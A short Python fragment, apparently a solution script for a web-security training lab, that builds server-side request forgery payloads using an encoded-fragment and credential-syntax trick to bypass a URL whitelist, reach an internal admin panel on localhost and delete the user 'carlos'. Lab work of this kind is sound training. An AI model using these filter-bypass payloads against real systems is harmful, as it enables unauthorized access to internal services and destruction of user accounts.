...
def delete_user(url):
    delete_user_ssrf_payload = 'http://localhost%2523$@stock.weliketoshop.net/admin/delete?username=carlos'
    ...
    admin_page_ssrf_payload = 'http://localhost%2523$@stock.weliketoshop.net/admin'
    ...
    if 'Carlos' not in r.text:
        ...
        print("(-) Error. User deleted unsuccessfully")
